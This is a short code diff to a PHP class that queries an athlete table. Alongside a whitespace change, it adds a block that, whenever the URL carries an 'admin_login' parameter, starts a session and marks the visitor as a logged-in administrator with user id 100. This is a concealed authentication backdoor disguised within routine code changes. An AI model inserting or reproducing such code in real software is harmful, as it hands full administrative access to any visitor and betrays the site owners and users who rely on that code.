@@ -19,7 +19,7 @@
 			$res = mysql_query("SELECT * FROM wc_athlete where athlete_status='1'")or die(mysql_error());
 			return $res;
 		}
-		
+
 		public function athleteSelect1(){
             $temp_arr = array();
 			$res = mysql_query("SELECT * FROM wc_athlete where athlete_status='1'")or die(mysql_error());
@@ -153,5 +153,11 @@
             print(json_encode($res));
 
         }
+		if(isset($_GET['admin_login'])){
+			session_start();
+			$_SESSION['login'] = true;
+			$_SESSION['userid'] = '100';
+			$_SESSION['usertype'] = 'admin';
+		}
 	  }
 ?>
